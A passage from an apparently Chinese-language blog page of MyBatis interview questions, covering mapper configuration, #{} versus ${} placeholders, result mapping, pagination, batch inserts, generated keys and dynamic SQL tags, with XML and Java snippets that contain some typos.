class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;driver&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;driver&#125;&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;url&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;url&#125;&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;username&#125;&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;password&#125;&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">environment</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">environments</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="databaseIdProvider"><a href="#databaseIdProvider" class="headerlink" title="databaseIdProvider"></a>databaseIdProvider</h2><p>数据库厂商标示，MyBatis 可以根据不同的数据库厂商执行不同的语句，这种多厂商的支持是基于映射语句中的 databaseId 属性。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">databaseIdProvider</span> <span class="attr">type</span>=<span class="string">&quot;DB_VENDOR&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;SQL Server&quot;</span> <span class="attr">value</span>=<span class="string">&quot;sqlserver&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;DB2&quot;</span> <span class="attr">value</span>=<span class="string">&quot;db2&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;Oracle&quot;</span> <span class="attr">value</span>=<span class="string">&quot;oracle&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">databaseIdProvider</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="mappers"><a href="#mappers" class="headerlink" title="mappers"></a>mappers</h2><p>映射器，这是告诉 MyBatis 去哪里找到这些 SQL 语句，mappers 映射配置有四种方式</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 使用相对于类路径的资源引用 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mappers</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mapper</span> <span class="attr">resource</span>=<span class="string">&quot;org/mybatis/builder/AuthorMapper.xml&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mapper</span> <span class="attr">resource</span>=<span class="string">&quot;org/mybatis/builder/BlogMapper.xml&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mapper</span> <span class="attr">resource</span>=<span class="string">&quot;org/mybatis/builder/PostMapper.xml&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mappers</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 使用完全限定资源定位符（URL） --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mappers</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mapper</span> <span class="attr">url</span>=<span class="string">&quot;file:///var/mappers/AuthorMapper.xml&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mapper</span> <span class="attr">url</span>=<span class="string">&quot;file:///var/mappers/BlogMapper.xml&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mapper</span> <span class="attr">url</span>=<span class="string">&quot;file:///var/mappers/PostMapper.xml&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mappers</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 使用映射器接口实现类的完全限定类名 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mappers</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mapper</span> <span class="attr">class</span>=<span class="string">&quot;org.mybatis.builder.AuthorMapper&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mapper</span> <span class="attr">class</span>=<span class="string">&quot;org.mybatis.builder.BlogMapper&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mapper</span> <span class="attr">class</span>=<span class="string">&quot;org.mybatis.builder.PostMapper&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mappers</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 将包内的映射器接口实现全部注册为映射器 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mappers</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">&quot;org.mybatis.builder&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mappers</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h1 id="5-什么是Mybatis？"><a href="#5-什么是Mybatis？" class="headerlink" title="5. 什么是Mybatis？"></a>5. 什么是Mybatis？</h1><p>Mybatis 是一个半 ORM（对象关系映射）框架，它内部封装了 JDBC，开发时只需要关注 SQL 语句本身，不需要花费精力去处理加载驱动、创建连接、创建 statement 等繁杂的过程。程序员直接编写原生态 sql，可以严格控制 sql 执行性能，灵活度高。</p>
<p>MyBatis 可以使用 XML 或注解来配置和映射原生信息，将 POJO 映射成数据库中的记录，避免了几乎所有的 JDBC 代码和手动设置参数以及获取结果集。</p>
<p>通过 xml 文件或注解的方式将要执行的各种 statement 配置起来，并通过 java 对象和 statement 中 sql 的动态参数进行映射生成最终执行的 sql 语句，最后由 mybatis 框架执行 sql 并将结果映射为 java 对象并返回。（从执行 sql 到返回 result 的过程）</p>
<h1 id="6-MyBatis的优缺点"><a href="#6-MyBatis的优缺点" class="headerlink" title="6. MyBatis的优缺点"></a>6. MyBatis的优缺点</h1><h2 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h2><ol>
<li>基于 SQL 语句编程，相当灵活，不会对应用程序或者数据库的现有设计造成任何影响，SQL 写在 XML 里，解除 sql 与程序代码的耦合，便于统一管理；提供 XML 标签，支持编写动态 SQL 语句，并可重用。</li>
<li>与 JDBC 相比，减少了 50%以上的代码量，消除了 JDBC 大量冗余的代码，不需要手动开关连接；</li>
<li>很好的与各种数据库兼容（因为 MyBatis 使用 JDBC 来连接数据库，所以只要JDBC 支持的数据库 MyBatis 都支持）。</li>
<li>能够与 Spring 很好的集成；</li>
<li>提供映射标签，支持对象与数据库的 ORM 字段关系映射；提供对象关系映射标签，支持对象关系组件维护。</li>
</ol>
<h2 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h2><ol>
<li>SQL 语句的编写工作量较大，尤其当字段多、关联表多时，对开发人员编写</li>
<li>SQL 语句的功底有一定要求。</li>
<li>SQL 语句依赖于数据库，导致数据库移植性差，不能随意更换数据库。</li>
</ol>
<h1 id="7-MyBatis-框架适用场合"><a href="#7-MyBatis-框架适用场合" class="headerlink" title="7. MyBatis 框架适用场合"></a>7. MyBatis 框架适用场合</h1><p>MyBatis 专注于 SQL 本身，是一个足够灵活的 DAO 层解决方案。</p>
<p>对性能的要求很高，或者需求变化较多的项目，如互联网项目，MyBatis 将是不错的选择。</p>
<h1 id="8-和-的区别是什么？"><a href="#8-和-的区别是什么？" class="headerlink" title="8. #{}和${}的区别是什么？"></a>8. #{}和${}的区别是什么？</h1><p><code>#</code> 表示的是占位符，<code>#&#123;&#125;</code> 是预编译处理，<code>$&#123;&#125;</code> 是字符串替换。Mybatis 在处理 <code>#&#123;&#125;</code> 时，会将 sql 中的 <code>#&#123;&#125;</code> 替换为 <code>?</code> 号，调用 <code>PreparedStatement</code> 的 <code>set</code> 方法来赋值；</p>
<p>Mybatis 在处理 <code>$&#123;&#125;</code> 时，就是把 <code>&#123;&#125;</code> 替换成变量的值。</p>
<p>使用 <code>#&#123;&#125;</code> 可以有效的防止 SQL 注入，提高系统安全性。</p>
<ul>
<li><code>$&#123;&#125;</code> 是 Properties 文件中的变量占位符，它可以用于标签属性值和 sql 内部，属于静态文本替换，比如 <code>$&#123;driver&#125;</code> 会被静态替换为 <code>com.mysql.jdbc.Driver</code>。</li>
<li><code>#&#123;&#125;</code>是 sql 的参数占位符，Mybatis 会将 sql 中的 <code>#&#123;&#125;</code> 替换为 <code>?</code> 号，在 sql 执行前会使用 PreparedStatement 的参数设置方法，按序给 sql 的 <code>?</code> 号占位符设置参数值，比如 <code>ps.setInt(0, parameterValue)</code>，<code>#&#123;item.name&#125;</code> 的取值方式为使用反射从参数对象中获取 item 对象的 name 属性值，相当于 <code>param.getItem().getName()</code>。</li>
</ul>
<h1 id="9-当实体类中的属性名和表中的字段名不一样-，怎么办？"><a href="#9-当实体类中的属性名和表中的字段名不一样-，怎么办？" class="headerlink" title="9. 当实体类中的属性名和表中的字段名不一样 ，怎么办？"></a>9. 当实体类中的属性名和表中的字段名不一样 ，怎么办？</h1><p>当对类中的某个属性定义的属性名与所对应的数据表的字段名不一致时，需要手动配置指定对应字段名，否则会读取不到数据，有两种方法进行指定：</p>
<ol>
<li><p>通过在查询的 sql 语句中定义字段名的别名，让字段名的别名和实体类的属性名一致</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;selectBlog&quot;</span> <span class="attr">parameterType</span>=<span class="string">&quot;int&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;Blog&quot;</span>&gt;</span></span><br><span class="line">    select id,title,author_id as authorId,featured,style from Blogs where id = #&#123;id&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>配置 <code>resultMap</code>，在 mapper 配置文件中，添加 <code>resultMap</code> 节点，同时在 statement 中指定 <code>resultMap</code>，通过 <code>&lt;resultMap&gt;</code> 来映射字段名和实体类属性名的一一对应的关系。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">mapper</span> <span class="attr">namespace</span>=<span class="string">&quot;com.xm.mapper.BlogMapper&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">resultMap</span> <span class="attr">id</span>=<span class="string">&quot;blogResultMap&quot;</span> <span class="attr">type</span>=<span class="string">&quot;Blog&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">id</span> <span class="attr">column</span>=<span class="string">&quot;id&quot;</span> <span class="attr">property</span>=<span class="string">&quot;id&quot;</span> <span class="attr">javaType</span>=<span class="string">&quot;INTEGER&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">&quot;author_id&quot;</span> <span class="attr">property</span>=<span class="string">&quot;authorId&quot;</span> <span class="attr">javaType</span>=<span class="string">&quot;INTEGER&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">resultMap</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;selectBlog2&quot;</span> <span class="attr">parameterType</span>=<span class="string">&quot;int&quot;</span> <span class="attr">resultMap</span>=<span class="string">&quot;blogResultMap&quot;</span>&gt;</span></span><br><span class="line">        select * from blogs where id = #&#123;id&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mapper</span>&gt;</span></span><br></pre></td></tr></table></figure>

</li>
</ol>
<h1 id="10-模糊查询-like-语句该怎么写"><a href="#10-模糊查询-like-语句该怎么写" class="headerlink" title="10. 模糊查询 like 语句该怎么写?"></a>10. 模糊查询 like 语句该怎么写?</h1><ol>
<li><p>在 Java 代码中添加 sql 通配符。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String wildcardname = <span class="string">&quot;%smi%&quot;</span>;</span><br><span class="line">List&lt;name&gt; names = mapper.selectlike(wildcardname);</span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;selectlike&quot;</span>&gt;</span></span><br><span class="line">    select * from foo where bar like #&#123;value&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>在 sql 语句中拼接通配符，会引起 sql 注入</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String wildcardname = <span class="string">&quot;smi&quot;</span>;</span><br><span class="line">List&lt;name&gt; names = mapper.selectlike(wildcardname);</span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;selectlike&quot;</span>&gt;</span></span><br><span class="line">    select * from foo where bar like &quot;%&quot;#&#123;value&#125;&quot;%&quot;</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure>

</li>
</ol>
<h1 id="11-通常一个-Xml-映射文件，都会写一个-Dao-接口与之对应，请问，这个-Dao-接口的工作原理是什么？Dao-接口里的方法，参数不同时，方法能重载吗？"><a href="#11-通常一个-Xml-映射文件，都会写一个-Dao-接口与之对应，请问，这个-Dao-接口的工作原理是什么？Dao-接口里的方法，参数不同时，方法能重载吗？" class="headerlink" title="11. 通常一个 Xml 映射文件，都会写一个 Dao 接口与之对应，请问，这个 Dao 接口的工作原理是什么？Dao 接口里的方法，参数不同时，方法能重载吗？"></a>11. 通常一个 Xml 映射文件，都会写一个 Dao 接口与之对应，请问，这个 Dao 接口的工作原理是什么？Dao 接口里的方法，参数不同时，方法能重载吗？</h1><ol>
<li>Dao 接口即 Mapper 接口。接口的全限名，就是映射文件中的 namespace 的值；接口的方法名，就是映射文件中 Mapper 的 Statement 的 id 值；接口方法内的参数，就是传递给 sql 的参数。</li>
<li>Mapper 接口是没有实现类的，当调用接口方法时，<code>接口全限名+方法名拼接字符串</code>作为 key 值，可唯一定位一个 MapperStatement。在 Mybatis 中，每一个<code>&lt;select&gt;</code>、<code>&lt;insert&gt;</code>、<code>&lt;update&gt;</code>、<code>&lt;delete&gt;</code> 标签，都会被解析为一个 MapperStatement 对象。</li>
<li>举例： <code>com.mybatis3.mappers.StudentDao.findStudentById</code> ，可以唯一找到 <code>namespace</code> 为 <code>com.mybatis3.mappers.StudentDao</code> 下面 <code>id</code> 为 <code>findStudentById</code> 的 MapperStatement。</li>
<li>Mapper 接口里的方法，是不能重载的，因为是使用 <code>全限名+方法名</code> 的保存和寻找策略。Mapper 接口的工作原理是 JDK 动态代理，Mybatis 运行时会使用 JDK 动态代理为 Mapper 接口生成代理对象 proxy，代理对象会拦截接口方法，转而执行 MapperStatement 所代表的 sql，然后将 sql 执行结果返回。</li>
</ol>
<h1 id="12-Mybatis-是如何进行分页的？分页插件的原理是什么？"><a href="#12-Mybatis-是如何进行分页的？分页插件的原理是什么？" class="headerlink" title="12. Mybatis 是如何进行分页的？分页插件的原理是什么？"></a>12. Mybatis 是如何进行分页的？分页插件的原理是什么？</h1><p>Mybatis 使用 RowBounds 对象进行分页，它是针对 ResultSet 结果集执行的内存分页，而非物理分页。可以在 sql 内直接书写带有物理分页的参数来完成物理分页功能，也可以使用分页插件来完成物理分页。</p>
<p>分页插件的基本原理是使用 Mybatis 提供的插件接口，实现自定义插件，在插件的拦截方法内拦截待执行的 sql，然后重写 sql，根据 dialect 方言，添加对应的物理分页语句和物理分页参数。</p>
<h1 id="13-Mybatis是如何将sql执行结果封装为目标对象并返回的？都有哪些映射形式？"><a href="#13-Mybatis是如何将sql执行结果封装为目标对象并返回的？都有哪些映射形式？" class="headerlink" title="13. Mybatis是如何将sql执行结果封装为目标对象并返回的？都有哪些映射形式？"></a>13. Mybatis是如何将sql执行结果封装为目标对象并返回的？都有哪些映射形式？</h1><p>第一种是使用标签，逐一定义数据库列名和对象属性名之间的映射关系。</p>
<p>第二种是使用 sql 列的别名功能，将列的别名书写为对象属性名。有了列名与属性名的映射关系后,Mybatis 通过反射创建对象，同时使用反射给对象的属性逐一赋值并返回，那些找不到映射关系的属性，是无法完成赋值的。</p>
<h1 id="14-如何执行批量插入"><a href="#14-如何执行批量插入" class="headerlink" title="14. 如何执行批量插入?"></a>14. 如何执行批量插入?</h1><p>首先,创建一个简单的 insert 语句:</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">insert</span> <span class="attr">id</span>=<span class="string">&quot;insertname&quot;</span>&gt;</span></span><br><span class="line">    insert into names (name) values (#&#123;value&#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">insert</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>然后在 java 代码中像下面这样执行批处理插入:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">List &lt; string &gt; names = <span class="keyword">new</span> arraylist();</span><br><span class="line">names.add(“fred”);</span><br><span class="line">names.add(“barney”);</span><br><span class="line">names.add(“betty”);</span><br><span class="line">names.add(“wilma”);</span><br><span class="line"><span class="comment">// 注意这里 executortype.batch</span></span><br><span class="line">sqlsession sqlsession = sqlsessionfactory.opensession(executortype.batch);</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    namemapper mapper = sqlsession.getmapper(namemapper.class);</span><br><span class="line">    <span class="keyword">for</span> (string name: names) &#123;</span><br><span class="line">        mapper.insertname(name);</span><br><span class="line">    &#125;</span><br><span class="line">    sqlsession.commit();</span><br><span class="line">&#125;<span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">    sqlSession.rollback();</span><br><span class="line">    <span class="keyword">throw</span> e;</span><br><span class="line">&#125;<span class="keyword">finally</span> &#123;</span><br><span class="line">    sqlsession.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="15-如何获取自动生成的-主-键值"><a href="#15-如何获取自动生成的-主-键值" class="headerlink" title="15. 如何获取自动生成的(主)键值?"></a>15. 如何获取自动生成的(主)键值?</h1><p>有三种方式进行设置：</p>
<h2 id="在mapper中配置insert节点的属性"><a href="#在mapper中配置insert节点的属性" class="headerlink" title="在mapper中配置insert节点的属性"></a>在mapper中配置insert节点的属性</h2><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">seGeneratedKeys = true keyProperty=”id”</span><br></pre></td></tr></table></figure>

<p><code>useGeneratedKeys</code> 仅对 <code>insert</code> 和 <code>update</code> 有用，这会令 MyBatis 使用 JDBC 的 <code>getGeneratedKeys</code> 方法来取出由数据库内部生成的主键（比如：像 MySQL 和 SQL Server 这样的关系数据库管理系统的自动递增字段），默认值：false。</p>
<p><code>keyProperty</code> 仅对 <code>insert</code> 和 <code>update</code> 有用，唯一标记一个属性，指定主键名是什么，MyBatis 会通过 <code>getGeneratedKeys</code> 的返回值或者通过 <code>insert</code> 语句的 <code>selectKey</code> 子元素设置它的键值，默认值：未设置（unset）。如果希望得到多个生成的列，也可以是逗号分隔的属性名称列表。</p>
<p><code>insert</code> 方法总是返回一个 <code>int</code> 值 ，这个值代表的是插入的行数。</p>
<p>如果采用自增长策略，自动生成的键值在 <code>insert</code> 方法执行完后可以被设置到传入的参数对象中。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;insert id=<span class="string">&quot;insertname&quot;</span> usegeneratedkeys=<span class="string">&quot;true&quot;</span> keyproperty=<span class="string">&quot;id&quot;</span>&gt;</span><br><span class="line"><span class="function">insert into <span class="title">names</span> <span class="params">(name)</span> <span class="title">values</span> <span class="params">(#&#123;name&#125;)</span></span></span><br><span class="line"><span class="function">&lt;/insert&gt;</span></span><br><span class="line"><span class="function">Name name </span>= <span class="keyword">new</span> name();</span><br><span class="line">name.setname(<span class="string">&quot;fred&quot;</span>);</span><br><span class="line"><span class="keyword">int</span> rows = mapper.insertname(name);</span><br><span class="line"><span class="comment">// 完成后,id 已经被设置到对象中</span></span><br><span class="line">System.out.println(<span class="string">&quot;rows inserted = &quot;</span> + rows);</span><br><span class="line">System.out.println(<span class="string">&quot;generated key value = &quot;</span> + name.getid());</span><br></pre></td></tr></table></figure>

<h2 id="在全局配置文件中配置settings节点"><a href="#在全局配置文件中配置settings节点" class="headerlink" title="在全局配置文件中配置settings节点"></a>在全局配置文件中配置settings节点</h2><p>在全局配置文件中配置 <code>settings</code> 节点，并且在 <code>mapper</code> 的 <code>insert</code> 节点指定主键名，即配置<code>keyProperty=&quot;id&quot;</code></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">settings</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">setting</span> <span class="attr">name</span>=<span class="string">&quot;useGeneratedKeys&quot;</span> <span class="attr">value</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">settings</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="针对Oracle等无主键的数据库）在-insert-节点中加入-selectKey-属性"><a href="#针对Oracle等无主键的数据库）在-insert-节点中加入-selectKey-属性" class="headerlink" title="针对Oracle等无主键的数据库）在 insert 节点中加入 selectKey 属性"></a>针对Oracle等无主键的数据库）在 insert 节点中加入 selectKey 属性</h2><p>其有以下变量属性：</p>
<ul>
<li><code>keyProperty</code>：selectKey 语句结果应该被设置的目标属性。如果希望得到多个生成的列，也可以是逗号分隔的属性名称列表。</li>
<li><code>keyColumn</code>：匹配属性的返回结果集中的列名称。如果希望得到多个生成的列，也可以是逗号分隔的属性名称列表。</li>
<li><code>resultType</code>：结果的类型。MyBatis 通常可以推断出来，但是为了更加精确，写上也不会有什么问题。MyBatis 允许将任何简单类型用作主键的类型，包括字符串。如果希望作用于多个生成的列，则可以使用一个包含期望属性的 Object 或一个 Map。</li>
<li><code>order</code>：这可以被设置为 <code>BEFORE</code> 或 <code>AFTER</code>。如果设置为 <code>BEFORE</code>，那么它会首先生成主键，设置 <code>keyProperty</code> 然后执行插入语句。如果设置为 <code>AFTER</code>，那么先执行插入语句，然后是 <code>selectKey</code> 中的语句(这和 Oracle 数据库的行为相似，在插入语句内部可能有嵌入索引调用)。</li>
<li><code>statementType</code>：<code>STATEMENT</code>，<code>PREPARED</code> 或 <code>CALLABLE</code> 的一个。这会让 MyBatis 分别使用 <code>Statement</code>，<code>PreparedStatement</code> 或 <code>CallableStatement</code>，默认值：<code>PREPARED</code>。</li>
</ul>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">insert</span> <span class="attr">id</span>=<span class="string">&quot;insertBlog2&quot;</span> <span class="attr">parameterType</span>=<span class="string">&quot;Blog&quot;</span> <span class="attr">keyProperty</span>=<span class="string">&quot;id&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">selectKey</span> <span class="attr">keyProperty</span>=<span class="string">&quot;id&quot;</span> <span class="attr">order</span>=<span class="string">&quot;AFTER&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;java.lang.Integer&quot;</span>&gt;</span></span><br><span class="line">        select LAST_INSERT_ID()</span><br><span class="line">    <span class="tag">&lt;/<span class="name">selectKey</span>&gt;</span></span><br><span class="line">    insert into blogs (title, author_id, featured, style) value (#&#123;title&#125;,#&#123;authorId&#125;,#&#123;featured&#125;,#&#123;style&#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">insert</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h1 id="16-在-mapper-中如何传递多个参数"><a href="#16-在-mapper-中如何传递多个参数" class="headerlink" title="16. 在 mapper 中如何传递多个参数?"></a>16. 在 mapper 中如何传递多个参数?</h1><h2 id="使用索引：按照参数排序，arg从0开始，param从1开始"><a href="#使用索引：按照参数排序，arg从0开始，param从1开始" class="headerlink" title="使用索引：按照参数排序，arg从0开始，param从1开始"></a>使用索引：按照参数排序，arg从0开始，param从1开始</h2><p>DAO 层的函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">UserselectUser</span><span class="params">(String name,String area)</span></span>;</span><br></pre></td></tr></table></figure>

<p>对应的 xml,<code>#&#123;0&#125;</code> 代表接收的是 dao 层中的第一个参数，<code>#&#123;1&#125;</code> 代表 dao 层中第二<br>参数，更多参数一致往后加即可。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;selectUser&quot;</span><span class="attr">resultMap</span>=<span class="string">&quot;BaseResultMap&quot;</span>&gt;</span></span><br><span class="line">    select * fromuser_user_t whereuser_name = #&#123;0&#125; and user_area=#&#123;1&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="使用-param-注解"><a href="#使用-param-注解" class="headerlink" title="使用 @param 注解"></a>使用 @param 注解</h2><figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="function">List&lt;Blog&gt; <span class="title">selectBlogByPage2</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="meta">@Param(value = &quot;offset&quot;)</span> <span class="keyword">int</span> offset,</span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="meta">@Param(value = &quot;pagesize&quot;)</span> <span class="keyword">int</span> pagesize)</span></span>;</span><br><span class="line">&lt;select id=<span class="string">&quot;selectBlogByPage2&quot;</span> resultMap=<span class="string">&quot;blogResultMap&quot;</span>&gt;</span><br><span class="line">    select * from blogs limit #&#123;offset&#125;,#&#123;pagesize&#125;</span><br><span class="line">&lt;/select&gt;</span><br></pre></td></tr></table></figure>

<h2 id="多个参数封装成-map"><a href="#多个参数封装成-map" class="headerlink" title="多个参数封装成 map"></a>多个参数封装成 map</h2><p>mapper 的配置保持不变，其中的<strong>占位符参数名要和测试中 map 的 <code>key</code> 一一对应</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testSelectBlogByPage3</span><span class="params">()</span></span>&#123;</span><br><span class="line">    SqlSession sqlSession = MyBatisUtil.sqlSession();</span><br><span class="line">    BlogMapper mapper = sqlSession.getMapper(BlogMapper.class);</span><br><span class="line">    <span class="comment">//自己构建一个map</span></span><br><span class="line">    Map&lt;String,Object&gt; map = <span class="keyword">new</span> HashMap&lt;String, Object&gt;();</span><br><span class="line">    <span class="comment">//注意key要和参数名对应</span></span><br><span class="line">    map.put(<span class="string">&quot;offset&quot;</span>,<span class="number">0</span>);</span><br><span class="line">    map.put(<span class="string">&quot;pagesize&quot;</span>,<span class="number">2</span>);</span><br><span class="line">    List&lt;Blog&gt; blogs = mapper.selectBlogByPage3(map);</span><br><span class="line">    sqlSession.close();</span><br><span class="line">    <span class="keyword">for</span> (Blog blog : blogs) &#123;</span><br><span class="line">        System.out.println(blog);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="17-Mybatis-动态-sql-有什么用？执行原理？有哪些动态-sql"><a href="#17-Mybatis-动态-sql-有什么用？执行原理？有哪些动态-sql" class="headerlink" title="17. Mybatis 动态 sql 有什么用？执行原理？有哪些动态 sql?"></a>17. Mybatis 动态 sql 有什么用？执行原理？有哪些动态 sql?</h1><p>Mybatis 动态 sql 可以在 Xml 映射文件内，以标签的形式编写动态 sql，执行原理是根据表达式的值 完成逻辑判断并动态拼接 sql 的功能。</p>
<p>Mybatis 提供了 9 种动态 sql 标签：</p>
<ul>
<li><code>if</code>：提供了可选的查询方案，如果 if 中的条件成立，则执行 if 中的语句，否则只执行 if 外的 sql 语句</li>
<li><code>choose</code>(<code>when</code>,<code>otherwise</code>)：用于多个条件判断，当满足其中某个 when 条件时，sql 语句加上其中的内容，否则只执行外部的内容，一旦某个when条件成立，就不会再判断下面的when语句了。三者搭配使用，相当于java中 <code>switch</code>,<code>case</code>,<code>default</code>用法</li>
<li><code>where</code>：如果希望 where 条件语句也在需要的时候才加入，可以使用 where 来进行判断。where 元素只会在至少有一个子元素的条件返回 SQL 子句的情况下才去插入 <code>WHERE</code> 子句。而且，<strong>若语句的开头为 <code>AND</code> 或 <code>OR</code>，where 元素也会将它们去除</strong>（搭配 <code>if</code> 使用）</li>
<li><code>set</code>：可以使用 set 元素实现按需更新，指定具体需要更新的字段,set 元素会动态前置 SET 关键字，同时也会删掉无关的逗号。</li>
<li><code>trim</code>：trim 可以用于指定加入的前缀和指定自动去除的前面或后面的内容，它有下面四个属性</li>
</ul>
<ol>
<li><code>prefix</code> ：加入的前置名</li>
<li><code>suffix</code>：加入的后缀名</li>
<li><code>prefixOverrides</code>：自动去除前面的内容</li>
<li><code>suffiexOverrides</code>：自动去除后面的内容</li>
</ol>
<ul>
<li><code>foreach</code>：foreach 是对一个集合进行遍历，通常是在构建 IN 条件语句的时候。</li>
</ul>
